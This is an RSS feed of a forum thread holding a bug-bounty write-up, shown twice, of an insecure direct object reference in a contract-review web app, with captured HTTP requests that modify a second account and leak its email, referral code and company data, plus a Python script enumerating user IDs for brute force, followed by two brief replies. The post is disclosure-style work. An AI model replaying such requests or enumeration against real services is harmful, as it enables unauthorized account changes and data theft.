<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>IDOR leads to Data leakage and Profile Update</title>
    <link>https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025</link>
    <description>In another bug bounty session of mine, I came across a bounty program of a &quot;Contract Review&quot; company.

In their web app, one could register with a first/last name, an email and their company&#39;s name (and a password ofc).

Upon trying to figure out how the web app works, I updated my profile by changing my first name from &quot;vict0ni&quot; to &quot;vict0ni1337&quot;. I captured the request:

```
OPTIONS /users/5e335fafedd93a1f35b6ca27 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization,content-type
Origin: https://app.website.com
Connection: close
```
followed by:
```
PUT /users/5e335fafedd93a1f35b6ca27 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2KyIjoiNWUzMzVmYWZlZGQ5M2UxZjM1YjZjYTI3IiwiaWF0IjoxNTgwNDk1MDQ3LCJleHAiOjE1NTM3MjQ5NTA0N30.LM8jJM46ZvFPwlzJ9hezXf_W0oOSpgvfpOastWU7UZA
Content-Length: 188
Origin: https://app.website.com
Connection: close

{&quot;user&quot;:{&quot;firstName&quot;:&quot;vict0ni1337&quot;,&quot;lastName&quot;:&quot;0x00sec&quot;,&quot;email&quot;:&quot;vict0ni@bugcrowdninja.com&quot;,&quot;password&quot;:null,&quot;dismissedGuides&quot;:{&quot;contractHelpPopup&quot;:false},&quot;company&quot;:&quot;5e335faeedd93a1f35b6ca26&quot;}}
```
resulting to this response:
```
HTTP/1.1 200 OK
Date: Thu, 06 Feb 2020 13:43:35 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 948
Connection: close
Set-Cookie: __cfduid=db2571d1ac9e83a96ca3265b9a0bf1d4c1580996613; expires=Sat, 07-Mar-20 13:43:33 GMT; path=/; domain=.website.com; HttpOnly; SameSite=Lax
Access-Control-Allow-Origin: https://app.website.com
ETag: W/&quot;3b4-QbbUm9x0qtqg3/Bqcixd7mbQgqw&quot;
Vary: Origin, Accept-Encoding
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;
Server: cloudflare
CF-RAY: 560d8dc0581c4098-HAM

{&quot;users&quot;:[{&quot;contracts&quot;:[],&quot;createdAt&quot;:1580425135972,&quot;updatedAt&quot;:1580996613958,&quot;id&quot;:&quot;5e335fafedd93a1f35b6ca27&quot;,&quot;email&quot;:&quot;vict0ni@bugcrowdninja.com&quot;,&quot;firstName&quot;:&quot;vict0ni1337&quot;,&quot;lastName&quot;:&quot;0x00sec&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;resetPasswordTokenExpires&quot;:0,&quot;dismissedGuides&quot;:{&quot;contractHelpPopup&quot;:false},&quot;dripId&quot;:&quot;3measgw3gr1yjpgvddqn&quot;,&quot;deleted&quot;:false,&quot;master&quot;:false,&quot;lastLogoutDate&quot;:0,&quot;company&quot;:&quot;5e335faeedd93a1f35b6ca26&quot;}],&quot;companies&quot;:[{&quot;createdAt&quot;:1580425133542,&quot;updatedAt&quot;:1580428552059,&quot;id&quot;:&quot;5e335faeedd93a1f35b6ca26&quot;,&quot;name&quot;:&quot;BugBounty&quot;,&quot;seq&quot;:5119,&quot;vatId&quot;:&quot;&quot;,&quot;phone&quot;:&quot;1337&quot;,&quot;country&quot;:null,&quot;employeeCount&quot;:&quot;&quot;,&quot;singleReviewsAvailable&quot;:3,&quot;monthlyReviewsAvailable&quot;:0,&quot;referredByCode&quot;:&quot;&quot;,&quot;referralCode&quot;:&quot;zqpwr&quot;,&quot;referralExtraCredits&quot;:0,&quot;subscription&quot;:{&quot;id&quot;:&quot;16A1DGRp7Up0s1Qu7&quot;,&quot;planId&quot;:&quot;website-basic&quot;,&quot;planName&quot;:&quot;website Basic&quot;},&quot;emailInAddress&quot;:&quot;&quot;,&quot;links&quot;:{&quot;users&quot;:&quot;/companies/5e335faeedd93a1f35b6ca26/users&quot;,&quot;contracts&quot;:&quot;/companies/5e335faeedd93a1f35b6ca26/contracts&quot;}}]}
```
So I was making an OPTIONS request and then a PUT request with my personal userID ``5e335fafedd93a1f35b6ca27`` updating my first name (one could only change the first and last name) and responding back with a 200 HTTP response and a bunch of info about my account and my company.

I always make two accounts when testing a web app. I did the same thing for my second account, just to grab its userID. Then I thought what could happen if I used the userID of account B in a request to update the account A. So I did the exact same thing as described above, being authorized as a user of account A, but using the userID of account B:

```
PUT /users/5e3c8692f3d2c616c6ed78e9 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2KyIjoiNWUzMzVmYWZlZGQ5M2UxZjM1YjZjYTI3IiwiaWF0IjoxNTgwNDk1MDQ3LCJleHAiOjE1NTM3MjQ5NTA0N30.LM8jJM46ZvFPwlzJ9hezXf_W0oOSpgvfpOastWU7UZA
Content-Length: 188
Origin: https://app.website.com
Connection: close

{&quot;user&quot;:{&quot;firstName&quot;:&quot;vict0ni1337&quot;,&quot;lastName&quot;:&quot;0x00sec&quot;,&quot;email&quot;:&quot;vict0ni@bugcrowdninja.com&quot;,&quot;password&quot;:null,&quot;dismissedGuides&quot;:{&quot;contractHelpPopup&quot;:false},&quot;company&quot;:&quot;5e335faeedd93a1f35b6ca26&quot;}}
```
resulting to this response:

```
HTTP/1.1 200 OK
Date: Thu, 06 Feb 2020 21:38:07 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 943
Connection: close
Set-Cookie: __cfduid=d78cefde78c34008ca49d162306b8fcfb1581025085; expires=Sat, 07-Mar-20 21:38:05 GMT; path=/; domain=.website.com; HttpOnly; SameSite=Lax
Access-Control-Allow-Origin: https://app.website.com
ETag: W/&quot;3af-ctJNYxOVotnOZ8DYR4ejpainHVE&quot;
Vary: Origin, Accept-Encoding
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;
Server: cloudflare
CF-RAY: 561044dd2b4fcd93-CDG

{&quot;users&quot;:[{&quot;contracts&quot;:[],&quot;createdAt&quot;:1581024914019,&quot;updatedAt&quot;:1581025085895,&quot;id&quot;:&quot;5e3c8692f3d2c616c6ad78e9&quot;,&quot;email&quot;:&quot;yigoxa6599@jmail7.com&quot;,&quot;firstName&quot;:&quot;vict0ni1337&quot;,&quot;lastName&quot;:&quot;0x00sec&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;resetPasswordTokenExpires&quot;:0,&quot;dismissedGuides&quot;:{&quot;contractHelpPopup&quot;:false},&quot;dripId&quot;:&quot;5pjs1pjjwprphpkce0rj&quot;,&quot;deleted&quot;:false,&quot;master&quot;:false,&quot;lastLogoutDate&quot;:0,&quot;company&quot;:&quot;5e3c8690f3d2c616c6ed78e8&quot;}],&quot;companies&quot;:[{&quot;createdAt&quot;:1581024911551,&quot;updatedAt&quot;:1581024919638,&quot;id&quot;:&quot;5e3c8690f3d2c616c6ed78e8&quot;,&quot;name&quot;:&quot;CompanyB&quot;,&quot;seq&quot;:5137,&quot;vatId&quot;:&quot;dummyVATID&quot;,&quot;phone&quot;:&quot;1234567890&quot;,&quot;country&quot;:null,&quot;employeeCount&quot;:&quot;&quot;,&quot;singleReviewsAvailable&quot;:3,&quot;monthlyReviewsAvailable&quot;:0,&quot;referredByCode&quot;:&quot;&quot;,&quot;referralCode&quot;:&quot;plozx&quot;,&quot;referralExtraCredits&quot;:0,&quot;subscription&quot;:{&quot;id&quot;:&quot;16BcmbRpl5Qvt1Lwv&quot;,&quot;planId&quot;:&quot;website-basic&quot;,&quot;planName&quot;:&quot;website Basic&quot;},&quot;emailInAddress&quot;:&quot;&quot;,&quot;links&quot;:{&quot;users&quot;:&quot;/companies/5e3c8690f3d2c616c6ed78e8/users&quot;,&quot;contracts&quot;:&quot;/companies/5e3c8690f3d2c616c6ed78e8/contracts&quot;}}]}
```
So, by changing the userID to the account B&#39;s userID, I could update the account B&#39;s first and last name, grab it&#39;s mail, referral code, companyID, subscription plan, number of employees, phone number, the company&#39;s [VAT identification number](https://en.wikipedia.org/wiki/VAT_identification_number) etc., while being authorized as account A. With the referral code, a user could use it to gain $30 as a &quot;gift&quot; for getting referred by another user.

Probably the server did not identifiy who was sending the ``Authorization`` header and it was just making sure that a valid Authorization header existed.

While that&#39;s all good, the userID of each account remains secret. There had to be some kind of MiTM attack to capture it and make a targeted attack. So I thought maybe I could generalize the attack, instead of targeting a single account.
By using dummy userIDs, in order to test the brute-force protection, I found out that the endpoint was vulnerable to brute-force attacks. Since the userID is following a certain pattern (a string of 24 hex characters), one could generate all the possible IDs and save them into a file with this python script:

```python
import itertools

string = &#39;0123456789abcdef&#39;
file = open(&#39;userIDs.txt&#39;, &#39;w&#39;)
for p in itertools.product(string, repeat=24):
	writing = &#39;&#39;.join(p) + &#39;\n&#39;
	file.write(writing)
file.close()
```

With enough computing power, an attacker could change the first/last name of all users and grab their account and company info.

Thanks for reading!</description>
    
    <lastBuildDate>Fri, 14 Feb 2020 10:43:02 +0000</lastBuildDate>
    <category>Bug Bounty</category>
    <atom:link href="https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>IDOR leads to Data leakage and Profile Update</title>
        <dc:creator><![CDATA[device]]></dc:creator>
        <description><![CDATA[
            <p>Wow, this was great, thanks for sharing!</p>
          <p><a href="https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025/3</link>
        <pubDate>Fri, 14 Feb 2020 10:43:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-19025-3</guid>
        <source url="https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025.rss">IDOR leads to Data leakage and Profile Update</source>
      </item>
      <item>
        <title>IDOR leads to Data leakage and Profile Update</title>
        <dc:creator><![CDATA[Prom3DNS]]></dc:creator>
        <description><![CDATA[
            <p>Really cool Write-Up! <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025/2</link>
        <pubDate>Fri, 07 Feb 2020 23:50:49 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-19025-2</guid>
        <source url="https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025.rss">IDOR leads to Data leakage and Profile Update</source>
      </item>
      <item>
        <title>IDOR leads to Data leakage and Profile Update</title>
        <dc:creator><![CDATA[vict0ni]]></dc:creator>
        <description><![CDATA[
            <p>In another bug bounty session of mine, I came across a bounty program of a “Contract Review” company.</p>
<p>In their web app, one could register with a first/last name, an email and their company’s name (and a password ofc).</p>
<p>Upon trying to figure out how the web app works, I updated my profile by changing my first name from “vict0ni” to “vict0ni1337”. I captured the request:</p>
<pre><code class="lang-auto">OPTIONS /users/5e335fafedd93a1f35b6ca27 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization,content-type
Origin: https://app.website.com
Connection: close
</code></pre>
<p>followed by:</p>
<pre><code class="lang-auto">PUT /users/5e335fafedd93a1f35b6ca27 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2KyIjoiNWUzMzVmYWZlZGQ5M2UxZjM1YjZjYTI3IiwiaWF0IjoxNTgwNDk1MDQ3LCJleHAiOjE1NTM3MjQ5NTA0N30.LM8jJM46ZvFPwlzJ9hezXf_W0oOSpgvfpOastWU7UZA
Content-Length: 188
Origin: https://app.website.com
Connection: close

{"user":{"firstName":"vict0ni1337","lastName":"0x00sec","email":"vict0ni@bugcrowdninja.com","password":null,"dismissedGuides":{"contractHelpPopup":false},"company":"5e335faeedd93a1f35b6ca26"}}
</code></pre>
<p>resulting to this response:</p>
<pre><code class="lang-auto">HTTP/1.1 200 OK
Date: Thu, 06 Feb 2020 13:43:35 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 948
Connection: close
Set-Cookie: __cfduid=db2571d1ac9e83a96ca3265b9a0bf1d4c1580996613; expires=Sat, 07-Mar-20 13:43:33 GMT; path=/; domain=.website.com; HttpOnly; SameSite=Lax
Access-Control-Allow-Origin: https://app.website.com
ETag: W/"3b4-QbbUm9x0qtqg3/Bqcixd7mbQgqw"
Vary: Origin, Accept-Encoding
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 560d8dc0581c4098-HAM

{"users":[{"contracts":[],"createdAt":1580425135972,"updatedAt":1580996613958,"id":"5e335fafedd93a1f35b6ca27","email":"vict0ni@bugcrowdninja.com","firstName":"vict0ni1337","lastName":"0x00sec","role":"admin","resetPasswordTokenExpires":0,"dismissedGuides":{"contractHelpPopup":false},"dripId":"3measgw3gr1yjpgvddqn","deleted":false,"master":false,"lastLogoutDate":0,"company":"5e335faeedd93a1f35b6ca26"}],"companies":[{"createdAt":1580425133542,"updatedAt":1580428552059,"id":"5e335faeedd93a1f35b6ca26","name":"BugBounty","seq":5119,"vatId":"","phone":"1337","country":null,"employeeCount":"","singleReviewsAvailable":3,"monthlyReviewsAvailable":0,"referredByCode":"","referralCode":"zqpwr","referralExtraCredits":0,"subscription":{"id":"16A1DGRp7Up0s1Qu7","planId":"website-basic","planName":"website Basic"},"emailInAddress":"","links":{"users":"/companies/5e335faeedd93a1f35b6ca26/users","contracts":"/companies/5e335faeedd93a1f35b6ca26/contracts"}}]}
</code></pre>
<p>So I was making an OPTIONS request and then a PUT request with my personal userID <code>5e335fafedd93a1f35b6ca27</code> updating my first name (one could only change the first and last name) and responding back with a 200 HTTP response and a bunch of info about my account and my company.</p>
<p>I always make two accounts when testing a web app. I did the same thing for my second account, just to grab its userID. Then I thought what could happen if I used the userID of account B in a request to update the account A. So I did the exact same thing as described above, being authorized as a user of account A, but using the userID of account B:</p>
<pre><code class="lang-auto">PUT /users/5e3c8692f3d2c616c6ed78e9 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2KyIjoiNWUzMzVmYWZlZGQ5M2UxZjM1YjZjYTI3IiwiaWF0IjoxNTgwNDk1MDQ3LCJleHAiOjE1NTM3MjQ5NTA0N30.LM8jJM46ZvFPwlzJ9hezXf_W0oOSpgvfpOastWU7UZA
Content-Length: 188
Origin: https://app.website.com
Connection: close

{"user":{"firstName":"vict0ni1337","lastName":"0x00sec","email":"vict0ni@bugcrowdninja.com","password":null,"dismissedGuides":{"contractHelpPopup":false},"company":"5e335faeedd93a1f35b6ca26"}}
</code></pre>
<p>resulting to this response:</p>
<pre><code class="lang-auto">HTTP/1.1 200 OK
Date: Thu, 06 Feb 2020 21:38:07 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 943
Connection: close
Set-Cookie: __cfduid=d78cefde78c34008ca49d162306b8fcfb1581025085; expires=Sat, 07-Mar-20 21:38:05 GMT; path=/; domain=.website.com; HttpOnly; SameSite=Lax
Access-Control-Allow-Origin: https://app.website.com
ETag: W/"3af-ctJNYxOVotnOZ8DYR4ejpainHVE"
Vary: Origin, Accept-Encoding
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 561044dd2b4fcd93-CDG

{"users":[{"contracts":[],"createdAt":1581024914019,"updatedAt":1581025085895,"id":"5e3c8692f3d2c616c6ad78e9","email":"yigoxa6599@jmail7.com","firstName":"vict0ni1337","lastName":"0x00sec","role":"admin","resetPasswordTokenExpires":0,"dismissedGuides":{"contractHelpPopup":false},"dripId":"5pjs1pjjwprphpkce0rj","deleted":false,"master":false,"lastLogoutDate":0,"company":"5e3c8690f3d2c616c6ed78e8"}],"companies":[{"createdAt":1581024911551,"updatedAt":1581024919638,"id":"5e3c8690f3d2c616c6ed78e8","name":"CompanyB","seq":5137,"vatId":"dummyVATID","phone":"1234567890","country":null,"employeeCount":"","singleReviewsAvailable":3,"monthlyReviewsAvailable":0,"referredByCode":"","referralCode":"plozx","referralExtraCredits":0,"subscription":{"id":"16BcmbRpl5Qvt1Lwv","planId":"website-basic","planName":"website Basic"},"emailInAddress":"","links":{"users":"/companies/5e3c8690f3d2c616c6ed78e8/users","contracts":"/companies/5e3c8690f3d2c616c6ed78e8/contracts"}}]}
</code></pre>
<p>So, by changing the userID to the account B’s userID, I could update the account B’s first and last name, grab it’s mail, referral code, companyID, subscription plan, number of employees, phone number, the company’s <a href="https://en.wikipedia.org/wiki/VAT_identification_number">VAT identification number</a> etc., while being authorized as account A. With the referral code, a user could use it to gain $30 as a “gift” for getting referred by another user.</p>
<p>Probably the server did not identifiy who was sending the <code>Authorization</code> header and it was just making sure that a valid Authorization header existed.</p>
<p>While that’s all good, the userID of each account remains secret. There had to be some kind of MiTM attack to capture it and make a targeted attack. So I thought maybe I could generalize the attack, instead of targeting a single account.<br>
By using dummy userIDs, in order to test the brute-force protection, I found out that the endpoint was vulnerable to brute-force attacks. Since the userID is following a certain pattern (a string of 24 hex characters), one could generate all the possible IDs and save them into a file with this python script:</p>
<pre><code class="lang-python">import itertools

string = '0123456789abcdef'
file = open('userIDs.txt', 'w')
for p in itertools.product(string, repeat=24):
	writing = ''.join(p) + '\n'
	file.write(writing)
file.close()
</code></pre>
<p>With enough computing power, an attacker could change the first/last name of all users and grab their account and company info.</p>
<p>Thanks for reading!</p>
          <p><a href="https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025/1</link>
        <pubDate>Fri, 07 Feb 2020 17:37:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-19025-1</guid>
        <source url="https://0x00sec.org/t/idor-leads-to-data-leakage-and-profile-update/19025.rss">IDOR leads to Data leakage and Profile Update</source>
      </item>
  </channel>
</rss>
